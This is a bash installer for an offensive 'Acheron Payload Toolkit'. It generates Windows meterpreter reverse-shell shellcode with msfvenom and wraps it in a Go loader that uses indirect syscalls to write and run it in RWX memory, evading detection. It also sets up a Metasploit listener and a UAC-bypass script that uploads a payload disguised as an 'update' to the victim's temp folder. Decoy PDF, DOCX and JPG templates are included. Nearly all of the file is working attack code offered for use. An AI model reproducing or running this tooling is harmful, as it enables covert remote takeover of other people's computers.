#!/bin/bash
# Acheron Toolkit Installer - CLEAN WORKING VERSION

TOOLKIT_DIR="$HOME/acheron-toolkit"
BIN_DIR="$HOME/.local/bin"

mkdir -p "$TOOLKIT_DIR/templates"
mkdir -p "$BIN_DIR"

echo "[*] Installing Acheron Toolkit to $TOOLKIT_DIR"

# ===== toolkit.sh =====
cat > "$TOOLKIT_DIR/toolkit.sh" << 'TK_EOF'
#!/bin/bash
# Verbose ON by default, --quiet/-q to disable
VERBOSE=true
# Parse --quiet / -q to disable verbose
ARGS=()
for arg in "$@"; do
    if [ "$arg" = "--quiet" ] || [ "$arg" = "-q" ]; then
        VERBOSE=false
    else
        ARGS+=("$arg")
    fi
done
set -- "${ARGS[@]}"

log() { [ "$VERBOSE" = true ] && echo -e "\e[1;36m[VERBOSE]\e[0m $*"; }
info() { echo -e "\e[1;32m[+]\e[0m $*"; }
err() { echo -e "\e[1;31m[-]\e[0m $*"; }

run() {
    if [ "$VERBOSE" = true ]; then
        log "Running: $*"
        "$@" 2>&1
    else
        "$@" 2>&1
    fi
}

check_deps() {
    local ok=true
    command -v msfvenom >/dev/null 2>&1 || { err "msfvenom missing (sudo apt install metasploit-framework)"; ok=false; }
    command -v go >/dev/null 2>&1 || { err "go missing (sudo apt install golang-go)"; ok=false; }
    [ "$ok" = true ] && info "Dependencies OK" || return 1
}

clear
while true; do
    clear
    echo -e "\e[1;34m╔══════════════════════════════════════════════════╦\e[0m"
    echo -e "\e[1;34m║        \e[1;37mAcheron Payload Toolkit v1.0\e[1;34m         ║\e[0m"
    echo -e "\e[1;34m╠══════════════════════════════════════════════════╣\e[0m"
    echo -e "\e[1;34m║  \e[1;32m1\e[0m) Generate Reverse Shell (Acheron)      ║\e[0m"
    echo -e "\e[1;34m║  \e[1;32m2\e[0m) Start Listener (msfconsole)            ║\e[0m"
    echo -e "\e[1;34m║  \e[1;32m3\e[0m) Check Dependencies                      ║\e[0m"
    echo -e "\e[1;34m║  \e[1;32m0\e[0m) Exit                                    ║\e[0m"
    echo -e "\e[1;34m╚═══════════════════════════════════════════════════╝\e[0m"
    read -p $'\e[1;33m[?] \e[0mSelect: ' choice
    case $choice in
        1)
            check_deps || { read -p $'\n[Enter]'; continue; }
            read -p $'\e[1;33m[IP]\e[0m LHOST: ' lhost
            read -p $'\e[1;33m[PORT]\e[0m LPORT: ' lport
            echo -e "\e[1;34mTemplate:\e[0m\n 1) None\n 2) PDF\n 3) DOCX\n 4) JPG"
            read -p $'\e[1;33m[?] \e[0mSelect: ' ptemplate
            case $ptemplate in 1) pt="none" ;; 2) pt="pdf" ;; 3) pt="docx" ;; 4) pt="jpg" ;; *) pt="none" ;; esac
            /home/giovi/acheron-toolkit/acherongen.sh "$lhost" "$lport" "$pt"
            read -p $'\n[Enter]'
            ;;
        2)
            check_deps || { read -p $'\n[Enter]'; continue; }
            read -p $'\e[1;33m[LHOST]\e[0m LHOST: ' lhost
            read -p $'\e[1;33m[PORT]\e[0m LPORT: ' lport
            listener_file=$(/home/giovi/acheron-toolkit/listener_gen.sh "$lport" "$lhost")
            echo "[*] Listener generato: $listener_file"
            read -p $'\e[1;33m[?] \e[0mLanciare msfconsole ora? (y/n): ' launch
            if [ "$launch" = "y" ] || [ "$launch" = "Y" ]; then
                msfconsole -r "$listener_file"
            fi
            read -p $'\n[Enter]'
            ;;
        3)
            info "Checking dependencies..."
            command -v msfvenom && echo "  msfvenom: OK" || echo "  msfvenom: MISSING"
            command -v go && echo "  go: OK" || echo "  go: MISSING"
            go list -m github.com/f1zm0/acheron 2>/dev/null && echo "  acheron: OK" || echo "  acheron: will download"
            read -p $'\n[Enter]'
            ;;
        0) exit 0 ;;
        *) sleep 1 ;;
    esac
done
TK_EOF

# ===== acherongen.sh =====
cat > "$TOOLKIT_DIR/acherongen.sh" << 'GEN_EOF'
#!/bin/bash
set -e
# Verbose ON by default, --quiet/-q to disable, --verbose/-v accepted for compatibility
VERBOSE=true
ARGS=()
for arg in "$@"; do
    case "$arg" in
        --quiet|-q)
            VERBOSE=false
            ;;
        --verbose|-v)
            # Verbose is already on by default, just ignore
            ;;
        *)
            ARGS+=("$arg")
            ;;
    esac
done
set -- "${ARGS[@]}"

LHOST="$1"; LPORT="$2"; TEMPLATE="${3:-none}"
WORKDIR=$(mktemp -d)
OUTFILE="acheron_${LHOST}_${LPORT}.exe"
cd "$WORKDIR"

log() { [ "$VERBOSE" = true ] && echo -e "\e[1;36m[VERBOSE]\e[0m $*"; }
info() { echo -e "\e[1;32m[+]\e[0m $*"; }
err() { echo -e "\e[1;31m[-]\e[0m $*"; }

info "Generating shellcode for $LHOST:$LPORT..."
log "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hex EXITFUNC=thread"
MSF_OUT=$(msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f hex EXITFUNC=thread 2>&1)
MSF_EXIT=$?
# Filter out msfvenom warning messages - extract ONLY the pure hex line
SHELLCODE=$(echo "$MSF_OUT" | grep -E '^[0-9a-fA-F]{100,}$' | head -1 | tr -d '\n\r ')
echo "$SHELLCODE" > sc.hex
if [ $MSF_EXIT -ne 0 ] || [ -z "$SHELLCODE" ]; then
    err "msfvenom failed (exit $MSF_EXIT)"
    echo "$MSF_OUT"
    rm -rf "$WORKDIR"; exit 1
fi
log "msfvenom OK - Shellcode: $((${#SHELLCODE}/2)) bytes"

HEX=""
for i in $(seq 0 2 $((${#SHELLCODE}-2))); do
    HEX="${HEX}0x${SHELLCODE:$i:2},"
done
# Remove trailing comma
HEX="${HEX%,}"

log "Writing main.go..."
# Write main.go with the HEX array properly expanded
cat > main.go << GOEOF
package main
import ("unsafe"; "github.com/f1zm0/acheron"; "golang.org/x/sys/windows")
var scHex = []byte{$HEX}
func main() {
    var a,b uintptr; h:=uintptr(0xffffffffffffffff)
    ach,_:=acheron.New(); n:=len(scHex)
    ach.Syscall(ach.HashString("NtAllocateVirtualMemory"),h,uintptr(unsafe.Pointer(&a)),0,uintptr(unsafe.Pointer(&n)),windows.MEM_COMMIT|windows.MEM_RESERVE,windows.PAGE_EXECUTE_READWRITE)
    ach.Syscall(ach.HashString("NtWriteVirtualMemory"),h,a,uintptr(unsafe.Pointer(&scHex[0])),uintptr(n),0)
    ach.Syscall(ach.HashString("NtCreateThreadEx"),uintptr(unsafe.Pointer(&b)),windows.GENERIC_EXECUTE,0,h,a,0,0,0,0,0,0)
    windows.WaitForSingleObject(windows.Handle(b),0xffffffff)
}
GOEOF

log "Go mod init..."
GO_MOD_OUT=$(go mod init tmp 2>&1)
[ "$VERBOSE" = true ] && echo "$GO_MOD_OUT"

log "Downloading dependencies (timeout 120s)..."
timeout 120 go get github.com/f1zm0/acheron golang.org/x/sys/windows 2>&1 | tee /tmp/go_get.log
[ "$VERBOSE" = true ] && cat /tmp/go_get.log | grep -v "go: downloading"

info "Building GOOS=windows GOARCH=amd64..."
log "GOOS=windows GOARCH=amd64 go build -v -ldflags=\"-s -w\" -o $OUTFILE main.go"
log "Target: Windows x64 (amd64)"
log "Strip flags: -s (symbols) -w (DWARF)"
# Run build in background with timeout, capture output in real-time
log "Starting build (timeout 300s)..."
(
    GOOS=windows GOARCH=amd64 timeout 300 go build -v -ldflags="-s -w" -o "$OUTFILE" main.go 2>&1
    echo "BUILD_EXIT:$?" > /tmp/build_exit_code
) | tee /tmp/go_build.log &
BUILD_PID=$!
log "Build started (PID: $BUILD_PID). Waiting..."
wait $BUILD_PID
BUILD_EXIT=$(cat /tmp/build_exit_code 2>/dev/null | cut -d: -f2)
BUILD_OUT=$(cat /tmp/go_build.log 2>/dev/null || echo "timeout or error")
if [ ${BUILD_EXIT:-0} -eq 0 ]; then
    cd - >/dev/null
    mv "$WORKDIR/$OUTFILE" "./$OUTFILE"
    info "Generated: ./$OUTFILE ($(ls -lh ./$OUTFILE | awk '{print $5}'))"
    log "Binary: $(file ./$OUTFILE 2>/dev/null || echo 'PE32+ executable')"
    rm -rf "$WORKDIR"
else
    err "Build failed (exit $BUILD_EXIT)"
    echo "$BUILD_OUT"
    rm -rf "$WORKDIR"
    exit 1
fi
GEN_EOF

# ===== listener_gen.sh =====
cat > "$TOOLKIT_DIR/listener_gen.sh" << 'LIST_EOF'
#!/bin/bash
[ -z "$1" ] || [ -z "$2" ] && { echo "Usage: $0 <port> <lhost>" >&2; exit 1; }
PORT="$1"; LHOST="$2"
OUTFILE="/tmp/acheron_listener_${PORT}.rc"
BYPASS_RC="/tmp/bypassuac.rc"

# Generate dynamic bypass UAC script with LHOST/LPORT
cat > "/tmp/bypassuac.rc" << 'EOF'
# UAC Bypass Method 59 - Debug Object / PPID Spoofing
# Run MANUALLY in meterpreter: bypassuac

# Generate random payload name
set PAYLOAD_NAME update_$(date +%s)_$(shuf -i 1000-9999 -n 1).exe

# Generate new Acheron payload with same LHOST/LPORT
run generate -f exe -o /tmp/$PAYLOAD_NAME -p windows/x64/meterpreter/reverse_tcp -o LHOST=$LHOST -o LPORT=$PORT

# Upload to victim %TEMP%
upload /tmp/$PAYLOAD_NAME %TEMP%\$PAYLOAD_NAME

# Execute UAC bypass executable with our payload
execute -f C:\Windows\Temp\uacbypass.exe -a "%TEMP%\$PAYLOAD_NAME" -H -i

# Clean up
rm /tmp/$PAYLOAD_NAME
EOF

cat > "$OUTFILE" << RC
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $PORT
set ExitOnSession false
set EnableStageEncoding true

# Create alias 'bypassuac' automatically on session creation
set InitialAutoRunScript multi_console_command -rc /tmp/bypassuac_alias.rc

exploit -j -z
RC

# Create alias script
cat > /tmp/bypassuac_alias.rc << ALIAS_EOF
alias bypassuac resource /tmp/bypassuac.rc
ALIAS_EOF

echo "$OUTFILE"
echo "[+] Listener: $OUTFILE" >&2
echo "[*] Run: msfconsole -r $OUTFILE" >&2
echo "[*] Alias 'bypassuac' creato automaticamente su nuova sessione" >&2
LIST_EOF

# ===== templates =====
echo "%PDF-1.4" > "$TOOLKIT_DIR/templates/fake.pdf"
echo "fake docx" > "$TOOLKIT_DIR/templates/fake.docx"
echo "fake jpg" > "$TOOLKIT_DIR/templates/fake.jpg"

chmod +x "$TOOLKIT_DIR/toolkit.sh" "$TOOLKIT_DIR/acherongen.sh" "$TOOLKIT_DIR/listener_gen.sh"

# global command
cat > "$BIN_DIR/acheron" << EOF
#!/bin/bash
cd "$TOOLKIT_DIR" && exec ./toolkit.sh "\$@"
EOF
chmod +x "$BIN_DIR/acheron"

echo "[+] Installed to $TOOLKIT_DIR"
echo "[*] Add \$HOME/.local/bin to PATH if not already there"
echo "[*] Run: acheron"
echo "[*] Quiet: acheron -q"
echo "[*] Direct: $TOOLKIT_DIR/acherongen.sh 192.168.0.237 4444 none"